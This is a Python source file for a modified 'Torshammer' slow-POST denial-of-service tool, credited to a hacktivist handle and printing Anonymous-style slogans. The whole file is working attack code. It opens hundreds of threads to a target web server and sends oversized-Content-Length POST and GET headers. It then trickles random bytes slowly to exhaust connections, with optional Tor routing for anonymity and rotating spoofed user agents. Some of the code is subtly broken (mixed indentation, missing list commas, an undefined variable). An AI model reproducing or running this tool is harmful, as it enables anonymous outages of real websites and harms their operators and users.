#!/usr/bin/python
#Torshammer666-(edit) with New keep alive values added GET request, More randomizers and other tweaks. Also without terminal module.
#An0nsec666 An0nsecHackers 
import os
import re
import time
import sys
import random
import math
import getopt
import socks
import string
from threading import Thread

global stop_now

stop_now = False
host=''
url=''
useragents = [
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
 "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
 "Opera/9.20 (Windows NT 6.0; U; en)",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
 "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
 "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", # maybe not
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13"
 "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
 "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
 "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
 "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
 "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
 "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6"
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0"
]

class httpPost(Thread):
    def __init__(self, host, port, tor):
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.socks = socks.socksocket()
        self.tor = tor
        self.running = True
		
    def _send_http_post(self, pause =random.uniform(1 ,2)):
        global stop_now
        self.socks.send("POST / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
			"Cache-Control: no-cache\r\n"
			"Accept-Charset:ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
                        "Connection: keep-alive\r\n"
                        "Keep-Alive: 110\r\n"
                        "Content-Length: 10000\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
 			(self.host, random.choice(useragents)))	
	self.socks.send("GET / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Connection: keep-alive\r\n"
                        "Keep-Alive: 90\r\n"
                        "Content-Length: 4096\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
                        (self.host, random.choice(useragents)))	
        for i in range(0, 9999):
            if stop_now:
                self.running = False
                break
            p = random.choice(string.letters+string.digits+"@!#$%&*()&^-+='><\,/.~" * 2)
            print "Posting: %s" % p
            self.socks.send(p)
            time.sleep(random.uniform(0.1, 3))
        
	self.socks.close()
		
    def run(self):
        while self.running:
            while self.running:
                try:
                    if self.tor:     
                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)	
                    self.socks.connect((self.host, self.port))
                    print "Connected to target"
                    break
                except Exception, e:
                    if e.args[0] == 106 or e.args[0] == 60:
                        break
                    print "Error connecting"
                    time.sleep(random.uniform(0.1, 3))
                    continue
	
            while self.running:
                try:
                    self._send_http_post()
                except Exception, e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        print "Broken threads, restarting..."
                        self.socks = socks.socksocket()
                        break
                    time.sleep(random.uniform(0.1, 3))
                    pass
 
def usage():
    print "./torshammer.py -t <target> [-r <threads> -p <port> -T -h]"
    print " -t|--target <Hostname|IP>"
    print " -r|--threads <Number of threads> Defaults to 500"
    print " -p|--port <Web Server Port> Defaults to 80"
    print " -T|--tor Enable anonymising through tor on 127.0.0.1:9050"
    print " -h|--help Shows this help\n" 
    print "Eg. ./torshammer.py -t 192.168.1.100 -r 256\n"

def main(argv):
    
    try:
        opts, args = getopt.getopt(argv, "hTt:r:p:", ["help", "tor", "target=", "threads=", "port="])
    except getopt.GetoptError:
        usage() 
        sys.exit(-1)

    global stop_now
	
    target = ''
    threads = 256
    port = 80

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
            sys.exit(0)
        if o in ("-T", "--tor"):
            tor = True
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-r", "--threads"):
            threads = int(a)
        elif o in ("-p", "--port"):
            port = int(a)


    if target == '' or int(threads) <= 0:
        usage()
        sys.exit(-1)

    print "/*"
    print " * Target: %s Port: %d" % (target, port)
    print " * Threads: %d Tor: %s" % (threads, tor)
    print " * Give 2 mins. with Tor on before checking site"
    print " */"

    rthreads = []
    for i in range(threads):
        t = httpPost(target, port, tor)
        rthreads.append(t)
        t.start()

    while len(rthreads) > 0:
        try:
            rthreads = [t.join(1) for t in rthreads if t is not None and t.isAlive()]
        except KeyboardInterrupt:
            print "\nShutting down threads...\n"
            for t in rthreads:
                stop_now = True
                t.running = False

if __name__ == "__main__":
    print "\n/*"
    print " * ~An0nsec666: An0nsecHackers "
    print " * Torshammer With Tweaked keep alive value"
    print " * Added GET Request method& tweaked randomizers"
    print " * We are an0nymous #An0nsecHackers."
    print " * We are Legion."
    print " * We do not forgive. "
    print " * We do not forget."
    print " * Pedos... Expect us!!!."
    print " */\n"

    main(sys.argv[1:])
